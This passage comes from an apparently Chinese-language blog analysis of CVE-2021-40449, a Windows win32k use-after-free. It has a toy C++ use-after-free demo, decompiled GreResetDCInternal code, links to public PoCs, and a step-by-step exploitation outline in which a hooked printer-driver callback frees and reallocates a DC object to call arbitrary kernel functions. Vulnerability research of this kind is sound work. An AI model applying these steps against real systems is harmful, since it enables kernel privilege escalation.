&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 定义函数指针
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#a6e22e">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>function)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>class test {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> function p;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">test&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// new test对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> test &lt;span style="color:#f92672">*&lt;/span>t &lt;span style="color:#f92672">=&lt;/span> new &lt;span style="color:#a6e22e">test&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> test &lt;span style="color:#f92672">*&lt;/span>p &lt;span style="color:#f92672">=&lt;/span> t;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">-&amp;gt;&lt;/span>p &lt;span style="color:#f92672">=&lt;/span> method;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">p&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 释放t指向的test对象的空间
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> delete t;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> test &lt;span style="color:#f92672">*&lt;/span>pt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">size_t&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">10000&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 占用刚释放的对象的内存空间
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> pt &lt;span style="color:#f92672">=&lt;/span> (test &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#a6e22e">malloc&lt;/span>(&lt;span style="color:#66d9ef">sizeof&lt;/span>(test));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> pt&lt;span style="color:#f92672">-&amp;gt;&lt;/span>p &lt;span style="color:#f92672">=&lt;/span> badMethod;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这里原意想要调用method函数，但是实际调用了badMethod函数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;第二次调用&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">p&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;method&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">badMethod&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;bad method&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="image-20211111123430653" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211111123430653.png" />&lt;/p>
&lt;h4 id="漏洞形成分析">漏洞形成分析&lt;/h4>
&lt;p>该漏洞产生于&lt;strong>win32kfull!GreResetDCInternal&lt;/strong>函数中，该函数内会获取DC对象内的函数指针，并执行该函数指针指向的函数，但并未检查DC对象是否异常。所以如果可以在调用函数指针之前释放DC对象，并重新申请该对象的内存空间，通过构造内存布局，修改原DC对象的函数指针指向其他任意内核函数，就可以在win32kfull!GreResetDCInternal内实现&lt;strong>任意内核函数调用&lt;/strong>。&lt;/p>
&lt;p>根据代码，我们可以算出DCO对象和DC对象的函数指针的关系：function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针&lt;/p>
&lt;blockquote>
&lt;p>v10 = *(_QWORD *)(v8 + 48);&lt;/p>
&lt;p>v15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> __usercall GreResetDCInternal&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rax&lt;span style="color:#f92672">&amp;gt;&lt;/span>(HDC a1&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rcx&lt;span style="color:#f92672">&amp;gt;&lt;/span>, &lt;span style="color:#66d9ef">__int64&lt;/span> a2&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rdx&lt;span style="color:#f92672">&amp;gt;&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a3&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>r8&lt;span style="color:#f92672">&amp;gt;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v24; &lt;span style="color:#75715e">// [rsp+50h] [rbp-20h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v25; &lt;span style="color:#75715e">// [rsp+60h] [rbp-10h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v25, a1); &lt;span style="color:#75715e">// 利用构造函数从HDC创建DCOBJ对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v8 &lt;span style="color:#f92672">=&lt;/span> v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">··········&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>); &lt;span style="color:#75715e">// 赋值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1736&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (HDC)&lt;span style="color:#a6e22e">hdcOpenDCW&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>qword_1C0141EB0, v26, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>));&lt;span style="color:#75715e">// 创建新的DC对象，返回对应的HDC句柄
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v24, v13);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> (_QWORD &lt;span style="color:#f92672">*&lt;/span>)v24;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v24 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v12 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">116&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">308&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">309&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(_QWORD, _QWORD))(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2768&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v15 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">v15&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v14[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>i64));&lt;span style="color:#75715e">// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HmgSwapLockedHandleContents&lt;/span>(v3, &lt;span style="color:#ae81ff">0&lt;/span>i64, v6, &lt;span style="color:#ae81ff">0&lt;/span>i64, v23);&lt;span style="color:#75715e">// 交换旧的和新的HDC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">GreReleaseHmgrSemaphore&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">bDeleteDCInternal&lt;/span>(v6, &lt;span style="color:#ae81ff">1&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64); &lt;span style="color:#75715e">// 传入了hdcOpenDCW返回的HDC，但HmgSwapLockedHandleContents交换了新旧句柄对应的DC对象，此时v6句柄对应旧DC对象。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">······&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用该函数指针的时候，所用的两个参数也是源于用户传入的HDC句柄对应的DC对象。&lt;/p>
&lt;blockquote>
&lt;p>v10 = *(_QWORD *)(v8 + 48); _&lt;/p>
&lt;p>_v14[308] = *(_QWORD *)(v25 + 2464);&lt;/p>
&lt;p>v14[309] = *(_QWORD *)(v25 + 2472);&lt;/p>
&lt;p>v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));&lt;/p>
&lt;/blockquote>
&lt;p>在win32kfull!GreResetDCInternal函数的后半段会调用win32kbase!DeleteDCInternal函数释放传入该函数的HDC句柄所对应的DC对象，到这里就达成了use-after-free的&lt;strong>free步骤&lt;/strong>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>HDC v3;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v3&lt;span style="color:#f92672">=&lt;/span>a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (HDC)&lt;span style="color:#a6e22e">hdcOpenDCW&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>qword_1C0141EB0, v26, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>));&lt;span style="color:#75715e">// 创建新的HDC
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v6 &lt;span style="color:#f92672">=&lt;/span> v13;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v24, v13);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> (_QWORD &lt;span style="color:#f92672">*&lt;/span>)v24;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v24 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v12 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">116&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">308&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">309&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(_QWORD, _QWORD))(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2768&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v15 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">v15&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v14[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>i64));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">GreAcquireHmgrSemaphore&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">LOBYTE&lt;/span>(v23) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HmgSwapLockedHandleContents&lt;/span>(v3, &lt;span style="color:#ae81ff">0&lt;/span>i64, v6, &lt;span style="color:#ae81ff">0&lt;/span>i64, v23);&lt;span style="color:#75715e">// 交换旧的和新的HDC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">GreReleaseHmgrSemaphore&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 删除HDC句柄对应的DC对象。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">bDeleteDCInternal&lt;/span>(v6, &lt;span style="color:#ae81ff">1&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果在释放DC对象之后，重新申请DC对象空间，修改里面的函数指针内容，并通过某些步骤，让内核执行DC对象内的函数指针，即可达到&lt;strong>use步骤&lt;/strong>让内核执行任意内核函数。&lt;/p>
&lt;h3 id="漏洞利用分析">漏洞利用分析&lt;/h3>
&lt;p>POC:
&lt;a href="https://github.com/KaLendsi/CVE-2021-40449-Exploit" target="_blank">https://github.com/KaLendsi/CVE-2021-40449-Exploit&lt;/a>&lt;/p>
&lt;p>POC代码分析：
&lt;a href="https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp" target="_blank">https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp&lt;/a>&lt;/p>
&lt;p>要利用该漏洞，难点在于free DC对象之后怎么使得内核再次调用DC对象的函数指针，在正常GreResetDCInternal函数流程中，是先调用DC对象的函数指针再删除这个对象，即按照正常流程即不会有use-after-free的条件。&lt;/p>
&lt;p>在ring 3层调用ResetDC函数会通过系统调用进入内核调用函数NtGdiResetDC，在NtGdiResetDC会调用漏洞函数GreResetDCInternal，在GreResetDCInternal中会调用DC对象里面的函数指针。要利用该漏洞即要在调用函数指针之前完成三步动作：&lt;strong>1、释放DC对象2、重新申请原DC对象的内存空间3、完成内存空间的布局&lt;/strong>。&lt;/p>
&lt;p>在函数&lt;strong>GreResetDCInternal&lt;/strong>调用DC对象的函数指针之前会调用&lt;strong>win32kbase!hdcOpenDCW&lt;/strong>函数。&lt;strong>win32kbase!hdcOpenDCW&lt;/strong>函数会执行打印机驱动的用户态回调函数表里面的函数，该表里面存放了函数指针，该函数指针原先指向的是预定义的回调函数。在POC中覆盖这个函数指针，使其执行POC定义的回调函数。&lt;/p>
&lt;p>在自定义回调函数中再次执行ResetDC函数并传入同一HDC句柄，则会再次执行NtGdiResetDC和GreResetDCInternal函数，而在GreResetDCInternal的后半段，会释放传入的HDC对应的DC对象并创建新的DC对象。&lt;strong>此时达到了free步骤&lt;/strong>。&lt;/p>
&lt;p>在第二次ResetDC调用完成后，原DC对象已被释放，此时可以重新申请原DC对象的内存空间并完成内存布局，将原DC对象的函数指针和函数指针的参数的位置设置为想要执行的内核函数的地址及参数。在执行完第一次回调之后，GreResetDCInternal 将调用原DC对象内的函数指针，即完成了任意内核函数调用，&lt;strong>此时达到了use步骤&lt;/strong>。&lt;/p>
&lt;p>完整调用链如下图：&lt;/p>
&lt;p>
&lt;img alt="调用链" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" />&lt;/p>
&lt;p>其中漏洞相关的类定义如下，参考https://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DCLEVEL&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HDC hdcSave;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
